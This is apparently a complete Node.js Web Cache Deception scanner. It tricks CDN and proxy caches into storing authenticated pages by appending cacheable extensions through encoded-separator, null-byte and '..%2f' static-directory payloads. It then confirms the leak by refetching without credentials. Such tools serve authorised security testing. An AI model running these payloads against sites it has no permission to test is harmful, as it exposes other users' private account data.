const http = require('http');
const https = require('https');
const { URL } = require('url');

// List of common file extensions that are often configured to be cached.
const CACHEABLE_EXTENSIONS = ['css', 'js', 'jpg', 'jpeg', 'png', 'gif', 'svg', 'ico', 'webp', 'woff2', 'json'];

// Common cache headers and their 'HIT' values.
const CACHE_HIT_HEADERS = {
    'x-cache': 'hit',
    'cf-cache-status': 'hit', // Cloudflare
    'x-edge-hit-shield-result': 'hit', // AWS CloudFront
    'x-fastly-cache-status': 'hit', // Fastly
    'x-cache-status': 'hit', // Varnish
    'server-timing': 'hit', // Can sometimes include cache info
    'x-proxy-cache': 'hit', // Nginx, others
};

/**
 * Generates a random alphanumeric string.
 * @param {number} length The length of the string to generate.
 * @returns {string} A random string.
 */
function generateRandomString(length = 8) {
    return Math.random().toString(36).substring(2, 2 + length);
}

/**
 * Sends an HTTP/S request and returns the response headers and body.
 * @param {string} url The URL to request.
 * @param {object} headers Custom headers for the request.
 * @returns {Promise<{headers: object, body: string, statusCode: number, error?: string}>}
 */
function makeRequest(url, headers = {}) {
    return new Promise((resolve) => {
        let urlObj;
        try {
            urlObj = new URL(url);
        } catch (e) {
            resolve({ headers: {}, body: '', statusCode: 0, error: `Invalid URL: ${e.message}` });
            return;
        }

        const protocol = urlObj.protocol === 'https:' ? https : http;
        const options = {
            hostname: urlObj.hostname,
            port: urlObj.port,
            path: urlObj.pathname + urlObj.search,
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
                ...headers,
            },
            rejectUnauthorized: false // For self-signed certs in test environments
        };

        const req = protocol.request(options, (res) => {
            let body = '';
            res.on('data', (chunk) => {
                body += chunk;
            });
            res.on('end', () => {
                resolve({ headers: res.headers, body: body, statusCode: res.statusCode });
            });
        });

        req.on('error', (err) => {
            resolve({ headers: {}, body: '', statusCode: 500, error: err.message });
        });

        req.setTimeout(8000, () => {
            req.destroy();
            resolve({ headers: {}, body: '', statusCode: 408, error: 'Request timed out' });
        });

        req.end();
    });
}

/**
 * Checks if the response indicates a cache hit.
 * @param {object} headers The response headers.
 * @returns {{isHit: boolean, header: string, value: string}|{isHit: false}}
 */
function checkCacheHit(headers) {
    if (headers.age && parseInt(headers.age, 10) > 0) {
        return { isHit: true, header: 'Age', value: headers.age };
    }
    for (const header in headers) {
        const headerLower = header.toLowerCase();
        if (CACHE_HIT_HEADERS[headerLower]) {
            const headerValue = headers[header].toLowerCase();
            if (headerValue.includes(CACHE_HIT_HEADERS[headerLower])) {
                return { isHit: true, header: header, value: headers[header] };
            }
        }
    }
    return { isHit: false };
}

async function scanForWCD(targetUrl, sensitiveKeyword, authHeaders = {}) {
    console.log(`[+] Starting Web Cache Deception scan for: ${targetUrl}`);
    console.log(`[+] Using sensitive keyword: "${sensitiveKeyword}"`);
    if (Object.keys(authHeaders).length > 0) {
        console.log(`[+] Using authentication headers.`);
    } else {
        console.log(`[!] Warning: No authentication headers provided. Scan may not be effective for authenticated pages.`);
    }
    console.log('--------------------------------------------------');

    let vulnerabilityFound = false;

    // Helper function to execute a single test concurrently
    async function executeTest(fullAttackUrl, strategyName, ext, reasonMessage) {
        if (vulnerabilityFound) return; // Fast exit if a vulnerability was already found

        try {
            const primeResponse = await makeRequest(fullAttackUrl, authHeaders);

            if (primeResponse.error || primeResponse.statusCode !== 200 || !primeResponse.body.includes(sensitiveKeyword)) {
                return;
            }

            const checkResponse = await makeRequest(fullAttackUrl, {});

            if (checkResponse.statusCode === 200 && checkResponse.body.includes(sensitiveKeyword)) {
                const cacheStatus = checkCacheHit(checkResponse.headers);

                if (cacheStatus.isHit) {
                    if (vulnerabilityFound) return; // Prevent multiple outputs due to race conditions
                    vulnerabilityFound = true;
                    console.log('\n==================================================');
                    console.log('[!] VULNERABILITY CONFIRMED: Web Cache Deception');
                    console.log('==================================================');
                    console.log(`[+] Vulnerable Path: ${fullAttackUrl}`);
                    console.log(`[+] Reason: ${reasonMessage} ('${ext}') using the '${strategyName}' vector.`);
                    console.log(`   A web cache was tricked into storing this private content and serving it to unauthenticated users.`);
                    console.log(`[+] Proof: A request to the vulnerable path returned a cache hit, confirmed by the header:`);
                    console.log(`   '${cacheStatus.header}: ${cacheStatus.value}'`);
                    console.log('\n[+] To manually verify:');
                    console.log(`   1. Visit ${fullAttackUrl} in a browser where you are logged in.`);
                    console.log(`   2. Open a private/incognito browser window (or a different browser).`);
                    console.log(`   3. Visit ${fullAttackUrl}. If you see the private content, the vulnerability is confirmed.`);
                }
            }
        } catch (error) {
            // Silent catch to prevent console spam during parallel execution
        }
    }

    // --- Test Suite 1: Path Appending Strategies ---
    const pathAppendingStrategies = [
        { name: 'Standard Path (/)', build: (base, seg) => `${base}${seg}` },
        { name: 'URL-Encoded Slash (%2f)', build: (base, seg) => `${base}${seg.replace('/', '%2f')}` },
        { name: 'Semicolon Separator (;)', build: (base, seg) => `${base};${seg.substring(1)}` },
        { name: 'URL-Encoded Semicolon (%3b)', build: (base, seg) => `${base}%3b${seg.substring(1)}` },
        { name: 'URL-Encoded Hash (%23)', build: (base, seg) => `${base}%23${seg.substring(1)}` },
        { name: 'URL-Encoded Null-Byte (%00)', build: (base, seg) => `${base}${seg.replace('/', '%00/')}` },
        { name: 'URL-Encoded Line-Feed (%0a)', build: (base, seg) => `${base}${seg.replace('/', '%0a/')}` },
        { name: 'URL-Encoded Tab (%09)', build: (base, seg) => `${base}${seg.replace('/', '%09/')}` },
    ];

    console.log('\n[~] Executing Test Suite 1: Path Appending Strategies');
    const suite1Tasks = [];
    const baseUrl = targetUrl.endsWith('/') ? targetUrl.slice(0, -1) : targetUrl;

    for (const strategy of pathAppendingStrategies) {
        for (const ext of CACHEABLE_EXTENSIONS) {
            const attackSegment = `/${generateRandomString()}.${ext}`;
            const fullAttackUrl = strategy.build(baseUrl, attackSegment);
            const reasonMessage = `The application serves sensitive content on a URL with a cacheable extension`;
            suite1Tasks.push(executeTest(fullAttackUrl, strategy.name, ext, reasonMessage));
        }
    }

    await Promise.all(suite1Tasks);

    if (vulnerabilityFound) {
        console.log('\n[+] Scan complete.');
        return;
    }

    // --- Test Suite 2: Static Directory Bypass ---
    console.log('\n[~] Executing Test Suite 2: Static Directory Bypass');
    const COMMON_STATIC_DIRS = ['static', 'assets', 'resources', 'public', 'media', 'content', 'images'];
    const urlObj = new URL(targetUrl);
    const origin = urlObj.origin;
    const sensitivePath = urlObj.pathname.replace(/^\/|\/$/g, ''); // e.g. 'my-account'

    const suite2Tasks = [];

    for (const staticDir of COMMON_STATIC_DIRS) {
        for (const ext of CACHEABLE_EXTENSIONS) {
            const randomFileName = `${generateRandomString()}.${ext}`;
            // Vector: /static/..%2fprofile/fake.css
            const fullAttackUrl = `${origin}/${staticDir}/..%2f${sensitivePath}/${randomFileName}`;
            const reasonMessage = `The application is vulnerable to a static directory bypass. A path like '/${staticDir}/..%2f...' is normalized by the backend but cached under the '/${staticDir}/' rule`;
            suite2Tasks.push(executeTest(fullAttackUrl, 'Static Directory Bypass', ext, reasonMessage));
        }
    }

    await Promise.all(suite2Tasks);

    if (!vulnerabilityFound) {
        console.log('\n[+] Scan complete. No clear signs of Web Cache Deception were found with the provided parameters.');
    }
}

if (require.main === module) {
    const [,, targetUrl, sensitiveKeyword, cookie] = process.argv;

    if (!targetUrl || !sensitiveKeyword) {
        console.log("\nIdentifies Web Cache Deception vulnerability by tricking a cache into storing sensitive pages.");
        console.log("\nUsage: node webCacheDeceptionScanner.js <targetUrl> <sensitiveKeyword> [cookie]");
        console.log("\nArguments:");
        console.log("  <targetUrl>        - The URL of the sensitive page (e.g., 'https://example.com/my-account').");
        console.log("  <sensitiveKeyword> - A unique string from the sensitive page's body (e.g., 'Your email is').");
        console.log("  [cookie]           - (Optional) The full cookie string (e.g., 'session=xyz; id=123').");
        process.exit(1);
    }

    const authHeaders = {};
    if (cookie) {
        authHeaders['Cookie'] = cookie;
    }

    scanForWCD(targetUrl, sensitiveKeyword, authHeaders);
}
